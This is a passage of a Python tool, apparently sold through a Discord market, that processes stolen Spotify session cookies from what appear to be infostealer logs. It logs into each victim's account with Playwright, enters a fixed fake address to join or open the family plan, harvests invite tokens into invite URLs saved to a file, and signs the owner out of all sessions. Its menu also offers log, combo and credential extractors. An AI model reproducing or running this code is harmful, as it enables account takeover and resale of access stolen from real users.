            await context.add_cookies(cookies_playwright)

        await page.goto('https://www.spotify.com/de/account/subscription/change/')
        await page.wait_for_load_state('networkidle')

        if "login" in page.url:
            print(f"Invalid cookie: {cookie_file}")
            await context.close()
            return

        await page.click('#onetrust-accept-btn-handler')

        specific_selector = '#__next > div.encore-layout-themes.encore-dark-theme > div > div.sc-85f631f4-0.gLgINR > div.sc-c64dc02-0.pkJOG > div.sc-2a255d77-0.hSrzPr > div > div > div.sc-15a2717d-5.jzTiNr > div.sc-5ea421ba-0.iKZoTY'
        if await page.query_selector(specific_selector):

            await page.goto("https://www.spotify.com/de-en/account/family/")
            await page.wait_for_load_state('networkidle')

            current_url = page.url
            if "welcome" not in current_url:

                await page.goto('https://www.spotify.com/api/family/v1/family/home')
                await page.wait_for_load_state('networkidle')
            else:

                await page.wait_for_selector('#set-address-step-card > div.StepCard__CardContent-sc-a9c8644a-1.dblfCD', state='visible', timeout=10000)
                await page.click('#set-address-step-card > div.StepCard__CardContent-sc-a9c8644a-1.dblfCD')
                await page.fill('#address', '215 Beecham Dr, Pittsburgh, PA 15205, USA')
                await page.wait_for_selector('#__next > div > form > main > div > fieldset > div > button > span', state='visible', timeout=10000)
                await page.click('#__next > div > form > main > div > fieldset > div > button > span')
                await page.click('#confirm-address-dialog > footer > button.Button-sc-qlcn5g-0.cxAehW.encore-text-body-medium-bold.e-9530-button-primary.e-9530-button > span')

                await page.wait_for_timeout(10000)
                await page.goto('https://www.spotify.com/api/family/v1/family/home')
                await page.wait_for_load_state('networkidle')

        else:

            await page.evaluate('''() => {
                const pageHeight = document.documentElement.scrollHeight;
                window.scrollTo(0, pageHeight * 0.6);
            }''')

# Assuming the "Family" button is the second button in the list
            await page.click('#__next > div.encore-layout-themes.encore-dark-theme > div > div.sc-8fb515c6-0.hNgrFR > div.sc-8f172e8-0.hOzphg > div.sc-2a255d77-1.bqdcpg > div:nth-child(3) > div > div.sc-15a2717d-2.eRHOLH > div.sc-8289bc19-6.etQhyo > button')
            await page.wait_for_load_state('networkidle')




            current_url = page.url
            if "purchase" in current_url:
                print("Navigated to the purchase page. Closing the browser.")
                await page.keyboard.press('Enter')
                await context.close()
                return
            elif "confirm" in current_url:
                await page.evaluate('''() => {
                    const pageHeight = document.documentElement.scrollHeight;
                    window.scrollTo(0, pageHeight * 0.4);
                }''')
                print("Navigated to the confirmation page. Scrolled to 40%.")

                button_selector = '#__next > div.encore-layout-themes.encore-dark-theme > div > div.sc-8fb515c6-0.hNgrFR > div.sc-8f172e8-0.hOzphg > div.sc-1a67efa4-10.kyTIWX > button.encore-text-body-medium-bold.e-9812-focus-border.e-9812-button-primary.e-9812-button > span'
                await page.wait_for_selector(button_selector, state='visible', timeout=10000)
                await page.click(button_selector)

                await page.wait_for_selector('#set-address-step-card > div.StepCard__CardContent-sc-a9c8644a-1.dblfCD', state='visible', timeout=10000)
                await page.click('#set-address-step-card > div.StepCard__CardContent-sc-a9c8644a-1.dblfCD')
                await page.fill('#address', '215 Beecham Dr, Pittsburgh, PA 15205, USA')
                await page.wait_for_selector('#__next > div > form > main > div > fieldset > div > button > span', state='visible', timeout=10000)
                await page.click('#__next > div > form > main > div > fieldset > div > button > span')
                await page.click('#confirm-address-dialog > footer > button.Button-sc-qlcn5g-0.cxAehW.encore-text-body-medium-bold.e-9530-button-primary.e-9530-button > span')

                await page.wait_for_timeout(10000)
                await page.goto('https://www.spotify.com/api/family/v1/family/home')
                await page.wait_for_load_state('networkidle')

        response = await page.content()

        soup = BeautifulSoup(response, 'html.parser')
        pre_tag = soup.find('pre')

        if pre_tag and pre_tag.text.strip():
            try:
                data = json.loads(pre_tag.text.strip())
                invite_token = data.get('inviteToken')
                country = data.get('members', [{}])[0].get('country')

                if invite_token and country:

                    invite_url = f"https://www.spotify.com/{country.lower()}/family/join/invite/{invite_token}/"

                    output_file = os.path.join(os.path.dirname(cookie_file), 'output.txt')
                    with open(output_file, 'a') as file:
                        file.write("=====================\n")
                        file.write(f"{invite_url}\n")
                        file.write(f"inviteToken: {invite_token}\n")
                        file.write(f"country: {country}\n")
                        file.write("\n")

                print(f"Direct extraction successful for: {cookie_file}")
            except json.JSONDecodeError:
                print("Failed to parse JSON from page content.")
        else:
            print("No JSON data found in the <pre> tag.")

        await page.goto('https://www.spotify.com/de-en/account/sign-out-everywhere/')
        await page.wait_for_load_state('networkidle')
        await page.click('#__next > div.encore-layout-themes.encore-dark-theme > div > div.sc-8fb515c6-0.hNgrFR > div.sc-8f172e8-0.hOzphg > div > article > div.sc-a88f65e7-1.eNdcLR > a')
        await page.wait_for_load_state('networkidle')
        await context.close()

    except Exception as e:
        print(f"Error processing cookie file {cookie_file}: {e}")

async def main_async():
    """Main function to process all cookie files in a selected directory."""
    try:
        root = Tk()
        root.withdraw()
        folder_path = filedialog.askdirectory(title="Select the folder containing cookie files")

        if not folder_path:
            print("No folder selected. Exiting.")
            return

        cookie_files = [os.path.join(folder_path, f) for f in os.listdir(folder_path) if f.endswith('.txt')]

        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=False)

            # Process 5 files at a time
            for i in range(0, len(cookie_files), 5):
                batch_files = cookie_files[i:i+5]
                await asyncio.gather(*[process_cookie_file(cookie_file, browser) for cookie_file in batch_files])

            await browser.close()

    except Exception as e:
        print(f"Error in main execution: {e}")

def run_main_async():
    asyncio.run(main_async())

    
def xhaz():
    text = r"""                                                                                                              
░▒▓█▓▒░░▒▓█▓▒░  ░▒▓██████▓▒░  ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓████████▓▒░  ░▒▓██████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░        ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓██▓▒░  ░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓██████▓▒░  ░▒▓████████▓▒░ ░▒▓███████▓▒░  ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░    ░▒▓██▓▒░    ░▒▓████████▓▒░ 
   ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓██▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
   ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ 
   ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓██████▓▒░   ░▒▓██████▓▒░  ░▒▓████████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ 
                                                                                                         
                                                                                                         
            
  by @yakuzamarket | https://discord.gg/wYz4MtS4Yd

"""

    colors = [Fore.CYAN, Fore.BLUE, Fore.LIGHTCYAN_EX, Fore.BLUE, Fore.LIGHTBLUE_EX]
    
    
    for line in text.splitlines():
        color = random.choice(colors)  
        print(f"{color}{line}")


def main():
    #validate()
    set_console_title(f"SpotifyMarkets Tool | By itsgaspaa.  | version 1.0.4")
    clear_terminal()
    xhaz()

    print(f"{Fore.YELLOW}[1] Logs Extractor{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[2] Spotify Checker{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}[3] Spotify Gen{Style.RESET_ALL}")
    print(f"{Fore.BLUE}[4] Spotify Premium Adder{Style.RESET_ALL}")
    print(f"{Fore.RED}[5] Combo Extractor{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[6] Link Extractor{Style.RESET_ALL}")

    choice = input("Enter your choice (1, 2, 3, 4, 5, 6): ")

    if choice == '1':
        clear_screen()
        xhaz()

        root_folder = select_logs_folder()

        if not root_folder:
            print("No folder selected. Exiting.")
            sys.exit()

        try:
            remove_duplicates(root_folder)
        except Exception as e:
            print(f"Errore durante la rimozione dei duplicati: {e}, procedo comunque...")

        try:
            find_and_copy_cookies(root_folder)
        except Exception as e:
            print(f"Errore durante la copia dei cookie: {e}, procedo comunque...")

        input("Logs extraction finished. Press Enter to continue...")
        main()

    elif choice == '2':
        clear_screen()
        xhaz()
        root_folder = select_logs_folder()

        if not root_folder:
            print("No folder selected. Exiting.")
            sys.exit()

        num_threads = get_num_threads()
        checkNetscapeCookies(root_folder, num_threads)
        checkJsonCookies(root_folder, num_threads)

        input("Spotify checking finished. Press Enter to continue...")
        main()

    elif choice == '3':
        clear_screen()
        xhaz()
        spotify_gen()

        input("Spotify generation finished. Press Enter to continue...")
        main()

    elif choice == '4':
        clear_screen()
        xhaz()
        spotify_premium_adder()

        input("Spotify Premium Adder finished. Press Enter to continue...")
        main()

    elif choice == '5':
        clear_screen()
        xhaz()
        find_and_extract_credentials("[Combos_output]")

        input("Combo extraction finished. Press Enter to continue...")
        main()
    
    elif choice == '6':
        clear_screen()
        xhaz()
        run_main_async()
        input("Link extraction finished. Press Enter to continue...")
        main()

    else:
        print("Invalid choice. Please enter 1, 2, 3, 4, 5, 6")
        main()

if __name__ == "__main__":
    main()
